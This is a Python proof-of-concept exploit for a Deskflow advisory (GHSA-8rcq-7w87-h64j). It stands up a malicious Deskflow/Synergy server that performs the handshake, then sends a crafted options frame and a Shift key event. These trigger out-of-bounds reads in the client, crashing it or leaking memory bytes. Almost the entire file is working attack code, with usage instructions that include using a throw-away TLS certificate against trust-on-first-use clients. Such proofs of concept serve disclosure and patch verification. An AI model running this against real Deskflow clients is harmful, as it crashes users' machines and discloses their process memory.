#!/usr/bin/env python3
"""
PoC for GHSA-8rcq-7w87-h64j
Deskflow <= 1.26.0 - Unauthenticated server-controlled OOB read in
ServerProxy::setOptions / ServerProxy::translateKey
(src/lib/client/ServerProxy.cpp)

This script implements a hostile Deskflow server that:

  1. Performs the standard Deskflow/Synergy handshake
     (Hello, HelloBack, QInfo -> CInfo, CInfoAck, CResetOptions).
  2. Sends an attacker-crafted kMsgDSetOptions (DSOP) frame containing the
     option pair (kOptionModifierMapForShift, <attacker_offset>).
     The receiver writes <attacker_offset> verbatim into
     m_modifierTranslationTable[kKeyModifierIDShift] without validating that
     the value is < kKeyModifierIDLast (= 7).
  3. Sends a kMsgCEnter (CINN) frame so the client treats us as the active
     screen and accepts input events.
  4. Sends a kMsgDKeyDown (DKDN) frame for kKeyShift_L (0xEFE1).
     translateKey() then evaluates
         s_translationTable[m_modifierTranslationTable[Shift]][side]
     which performs an out-of-bounds read of the static .rodata array
     `s_translationTable[7][2]`.

With `--offset 8` the read lands one row past the array and the client
discloses four bytes of nearby .rodata to the server (via the side channels
listed in the advisory's Impact section).
With `--offset 0xFBFFFF04` the read lands in unmapped memory and the client
process is killed with SIGSEGV.
With `--odd`, the OptionsList itself is sent with odd length so that
setOptions reads options[i + 1] one element past the freshly allocated
std::vector<uint32_t> - the parallel heap-buffer-overflow read.

Affected: deskflow <= 1.26.0  (Synergy protocol v1.8 on the wire)
CWE: CWE-129 (improper validation of array index),
     CWE-125 (out-of-bounds read), CWE-20 (improper input validation)

Usage
-----

  # 1. Generate a throw-away cert (Deskflow's TLS uses TOFU; any cert works
  #    on a client that has not yet seen this server)
  openssl req -x509 -newkey rsa:2048 -nodes \\
      -keyout server.key -out server.crt -days 1 \\
      -subj "/CN=deskflow-poc"

  # 2. Run the malicious server (defaults: TLS on, port 24800,
  #    offset 0xFBFFFF04 - reliable SIGSEGV)
  python3 poc_ghsa_8rcq_7w87_h64j.py

  # 3. Point a Deskflow <= 1.26.0 client at this host
  #    (Settings -> Client -> "Use another computer's keyboard and mouse"
  #     -> Server IP). The client will crash on the first DKDN, or with
  #    --offset chosen inside .rodata it will leak 4 bytes per modifier-key
  #    event.

Reference: src/lib/client/ServerProxy.cpp:761-796 (setOptions, the write site)
           src/lib/client/ServerProxy.cpp:380-454 (translateKey, the sink)
"""

import argparse
import socket
import ssl
import struct
import sys
import time

# -------------------------------------------------------------------------
# Protocol constants (mirroring deskflow v1.26.0
# src/lib/deskflow/ProtocolTypes.{h,cpp}, src/lib/deskflow/OptionTypes.h
# and src/lib/deskflow/KeyTypes.h)
# -------------------------------------------------------------------------

# Hello greeting magic - "as luck would have it, both 'Synergy' and 'Barrier'
# are 7 chars" (Client::handleHello). Deskflow accepts either.
GREETING_SYNERGY = b"Synergy"
GREETING_BARRIER = b"Barrier"

# Protocol version Deskflow v1.26.0 speaks (kProtocolMajorVersion=1,
# kProtocolMinorVersion=8). All versions back to 1.3 take the same DSOP
# path so the bug is reachable on any of them - 1.8 is just the value we
# negotiate.
PROTOCOL_MAJOR = 1
PROTOCOL_MINOR = 8

# Default TCP port (kDefaultPort = 24800)
DEFAULT_PORT = 24800

# OPTION_CODE("XXXX") packs the four ASCII bytes into a big-endian uint32
def opt(tag: str) -> int:
    assert len(tag) == 4
    return int.from_bytes(tag.encode("ascii"), "big")

OPT_MMFS = opt("MMFS")  # kOptionModifierMapForShift
OPT_MMFC = opt("MMFC")  # kOptionModifierMapForControl
OPT_MMFA = opt("MMFA")  # kOptionModifierMapForAlt
OPT_MMFG = opt("MMFG")  # kOptionModifierMapForAltGr
OPT_MMFM = opt("MMFM")  # kOptionModifierMapForMeta
OPT_MMFR = opt("MMFR")  # kOptionModifierMapForSuper
OPT_HART = opt("HART")  # kOptionHeartbeat

# kKeyShift_L from src/lib/deskflow/KeyTypes.h - left shift key, will fire
# translateKey() with id2 = kKeyModifierIDShift = 1 and side = 0, so it is
# the cleanest trigger for the OOB read in s_translationTable.
KEY_SHIFT_L = 0xEFE1

# Message codes (only the four-byte ASCII prefix - bodies follow the
# ProtocolUtil format codes documented in ProtocolTypes.cpp).
MSG_QUERY_INFO    = b"QINF"   # server -> client: please send your screen info
MSG_INFO_ACK      = b"CIAK"   # server -> client: I received your info
MSG_RESET_OPTIONS = b"CROP"   # server -> client: reset options to defaults
MSG_SET_OPTIONS   = b"DSOP"   # server -> client: set these options  <-- bug
MSG_ENTER         = b"CINN"   # server -> client: cursor entered your screen
MSG_KEY_DOWN      = b"DKDN"   # server -> client: key pressed       <-- trigger
MSG_KEEP_ALIVE    = b"CALV"
MSG_CLIENT_INFO   = b"CINF"   # client -> server: my screen info


# -------------------------------------------------------------------------
# Wire I/O helpers. Deskflow frames every body with a 4-byte big-endian
# length prefix and uses big-endian for every multi-byte integer field
# inside the body. `%s` means "4-byte BE length, then that many bytes".
# `%Ns` (e.g. `%7s`) means "exactly N bytes, no length prefix".
# -------------------------------------------------------------------------

def send_packet(sock: socket.socket, body: bytes) -> None:
    """Frame `body` with a 4-byte BE length prefix and send it."""
    sock.sendall(struct.pack(">I", len(body)) + body)


def recv_exact(sock: socket.socket, n: int) -> bytes:
    buf = bytearray()
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise EOFError("peer closed during read")
        buf.extend(chunk)
    return bytes(buf)


def recv_packet(sock: socket.socket) -> bytes:
    n = struct.unpack(">I", recv_exact(sock, 4))[0]
    return recv_exact(sock, n) if n else b""


# -------------------------------------------------------------------------
# Handshake (server side)
# -------------------------------------------------------------------------

def send_hello(sock: socket.socket, greeting: bytes,
               major: int, minor: int) -> None:
    """kMsgHello = "%7s%2i%2i" - 7-byte fixed protocol name + version."""
    body = greeting + struct.pack(">hh", major, minor)
    send_packet(sock, body)
    print(f"[+] sent Hello(name={greeting!r}, v={major}.{minor})")


def recv_hello_back(sock: socket.socket) -> tuple[bytes, int, int, str]:
    """kMsgHelloBack = "%7s%2i%2i%s" - 7-byte name + version + client name."""
    body = recv_packet(sock)
    if len(body) < 11:
        raise ValueError(f"hello-back too short ({len(body)} bytes)")
    name      = body[0:7]
    major     = struct.unpack(">h", body[7:9])[0]
    minor     = struct.unpack(">h", body[9:11])[0]
    name_len  = struct.unpack(">I", body[11:15])[0]
    cname     = body[15:15 + name_len].decode("utf-8", errors="replace")
    print(f"[+] recv HelloBack(name={name!r}, v={major}.{minor}, "
          f"clientName={cname!r})")
    return name, major, minor, cname


def server_send_query_info(sock: socket.socket) -> None:
    send_packet(sock, MSG_QUERY_INFO)
    print("[+] sent QINF (please send screen info)")


def server_recv_client_info(sock: socket.socket) -> None:
    """Client should reply with kMsgDInfo = "DINF%2i%2i%2i%2i%2i%2i%2i"
    (the message is named CINF in the dispatcher but written via DINF on
    the wire). We just drain whatever it sends until we see DINF/CINF."""
    while True:
        body = recv_packet(sock)
        code = body[:4]
        print(f"[+] recv {code!r} ({len(body)} bytes)")
        if code in (b"DINF", b"CINF"):
            return
        # ignore CNOP/CALV/etc. and keep reading


def server_send_info_ack(sock: socket.socket) -> None:
    send_packet(sock, MSG_INFO_ACK)
    print("[+] sent CIAK")


def server_send_reset_options(sock: socket.socket) -> None:
    send_packet(sock, MSG_RESET_OPTIONS)
    print("[+] sent CROP (reset options - puts table back to identity)")


# -------------------------------------------------------------------------
# Crafted frames - the actual exploit primitives.
# -------------------------------------------------------------------------

def build_dsop(values: list[int]) -> bytes:
    """kMsgDSetOptions = "DSOP%4I"

    %4I encodes a list of 4-byte BE integers as:
        uint32_BE count
        count * uint32_BE values

    The vulnerable client loop iterates `for (i = 0; i < n; i += 2)` and
    treats `values[i]` as an option code and `values[i+1]` as the value.
    There is no parity check (so odd-length lists read past the vector
    end) and no bounds check vs kKeyModifierIDLast on the value before
    it is written into m_modifierTranslationTable[id].
    """
    body = MSG_SET_OPTIONS + struct.pack(">I", len(values))
    for v in values:
        body += struct.pack(">I", v & 0xFFFFFFFF)
    return body


def build_enter(seqnum: int = 1) -> bytes:
    """kMsgCEnter = "CINN%2i%2i%4i%2i" - x, y, seqnum, mask.

    The client only synthesises input events while it considers itself
    the active screen, so we send CINN before DKDN to make sure the key
    event is actually consumed. translateKey() is called either way, but
    CINN keeps the dispatcher in the steady state."""
    return MSG_ENTER + struct.pack(">hhIh", 100, 100, seqnum, 0)


def build_key_down(key_id: int, mask: int = 0, button: int = 0) -> bytes:
    """kMsgDKeyDown = "DKDN%2i%2i%2i" - id, mask, button."""
    return MSG_KEY_DOWN + struct.pack(">HHH", key_id, mask, button)


# -------------------------------------------------------------------------
# Per-connection handler
# -------------------------------------------------------------------------

def serve_one(sock: socket.socket, offset: int, odd: bool,
              greeting: bytes, major: int, minor: int) -> None:

    # ---- handshake ----
    send_hello(sock, greeting, major, minor)
    recv_hello_back(sock)

    server_send_query_info(sock)
    server_recv_client_info(sock)
    server_send_info_ack(sock)
    server_send_reset_options(sock)

    # ---- craft the malicious DSOP ----
    if odd:
        # Odd-length list (size 3). The loop body runs for i=0 and i=2.
        # At i=2, `options[i + 1]` reads options[3] - one element past
        # the freshly allocated std::vector<uint32_t>. We park
        # OPT_HART (heartbeat) in slot 2 so the `setKeepAliveRate`
        # branch executes too, doubling the heap-OOB read sites.
        values = [OPT_MMFS, offset & 0xFFFFFFFF, OPT_HART]
        print(f"[+] DSOP payload: odd-length list of size 3 "
              f"-> heap-OOB read of options[3] past std::vector end")
    else:
        # Even length: poisons m_modifierTranslationTable[kKeyModifierIDShift]
        # with the attacker-chosen 32-bit offset. The next time a modifier
        # KeyID arrives, s_translationTable[<offset>][side] is read.
        values = [OPT_MMFS, offset & 0xFFFFFFFF]
        print(f"[+] DSOP payload: MMFS -> {offset:#010x} "
              f"(poisons m_modifierTranslationTable[Shift] "
              f"with an OOB row index)")

    raw = build_dsop(values)
    send_packet(sock, raw)
    print(f"[+] sent DSOP ({len(raw)} bytes incl. code, "
          f"list_count={len(values)})")

    # ---- mark our screen active and fire the trigger ----
    send_packet(sock, build_enter())
    print("[+] sent CINN (cursor entered our virtual screen)")

    # translateKey(kKeyShift_L) now performs
    #     s_translationTable[m_modifierTranslationTable[Shift]][0]
    # which is the OOB read on the static .rodata array
    # `s_translationTable[7][2]`.
    send_packet(sock, build_key_down(KEY_SHIFT_L))
    print(f"[+] sent DKDN(kKeyShift_L=0x{KEY_SHIFT_L:04x}) - "
          f"OOB read of s_translationTable[{offset:#010x}][0] now firing")

    # Give the client a moment to either crash (SIGSEGV) or leak. After a
    # crash the socket goes to EOF; after a leak we may receive clipboard
    # echoes or key acks containing 4-byte rodata fragments.
    sock.settimeout(3.0)
    try:
        while True:
            data = sock.recv(4096)
            if not data:
                print("[+] client closed connection "
                      "(SIGSEGV likely - check the client logs)")
                return
            print(f"[<] client -> server {len(data)} bytes: "
                  f"{data[:64].hex()}{' ...' if len(data) > 64 else ''}")
    except (socket.timeout, ConnectionResetError) as exc:
        print(f"[+] read loop ended: {exc}")


# -------------------------------------------------------------------------
# CLI
# -------------------------------------------------------------------------

def main() -> int:
    p = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description=__doc__,
    )
    p.add_argument("--host", default="0.0.0.0",
                   help="bind address (default 0.0.0.0)")
    p.add_argument("--port", type=int, default=DEFAULT_PORT,
                   help=f"listen port (default {DEFAULT_PORT})")
    p.add_argument(
        "--offset", type=lambda x: int(x, 0), default=0xFBFFFF04,
        help=("attacker-controlled 32-bit OOB row index written into "
              "m_modifierTranslationTable[Shift]. "
              "Default 0xFBFFFF04 -> reliable SIGSEGV in unmapped memory; "
              "small values like 7 or 8 -> in-process OOB suitable for "
              "memory disclosure"),
    )
    p.add_argument("--odd", action="store_true",
                   help=("trigger the parallel heap-buffer-overflow read on "
                         "the OptionsList vector itself by sending an "
                         "odd-length list (3 entries)"))
    p.add_argument("--greeting", choices=["Synergy", "Barrier"],
                   default="Synergy",
                   help=("protocol name in the Hello message. Deskflow "
                         "accepts both - default Synergy"))
    p.add_argument("--major", type=int, default=PROTOCOL_MAJOR,
                   help=f"Hello major version (default {PROTOCOL_MAJOR})")
    p.add_argument("--minor", type=int, default=PROTOCOL_MINOR,
                   help=f"Hello minor version (default {PROTOCOL_MINOR})")
    p.add_argument("--cert", default="server.crt",
                   help="path to TLS certificate (default server.crt)")
    p.add_argument("--key",  default="server.key",
                   help="path to TLS private key (default server.key)")
    p.add_argument("--no-tls", action="store_true",
                   help=("listen as plain TCP. Only works if the client was "
                         "built without TLS or pointed at a non-TLS listener"))
    args = p.parse_args()

    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((args.host, args.port))
    listener.listen(1)
    print(f"[+] malicious deskflow server on {args.host}:{args.port} "
          f"(tls={'off' if args.no_tls else 'on'}, "
          f"greeting={args.greeting}, "
          f"offset={args.offset:#010x}, odd={args.odd})")

    ctx = None
    if not args.no_tls:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(certfile=args.cert, keyfile=args.key)

    try:
        while True:
            raw, addr = listener.accept()
            print(f"[+] client connected from {addr[0]}:{addr[1]}")
            conn = None
            try:
                conn = ctx.wrap_socket(raw, server_side=True) if ctx else raw
                serve_one(
                    conn,
                    args.offset,
                    args.odd,
                    args.greeting.encode("ascii"),
                    args.major,
                    args.minor,
                )
            except Exception as exc:
                print(f"[!] error serving client: {exc!r}")
            finally:
                try:
                    (conn or raw).close()
                except Exception:
                    pass
            # serve a single connection then exit; running once per
            # invocation keeps the PoC easy to reason about
            print("[+] connection done, exiting")
            return 0
    except KeyboardInterrupt:
        print("\n[+] shutdown")
    finally:
        listener.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
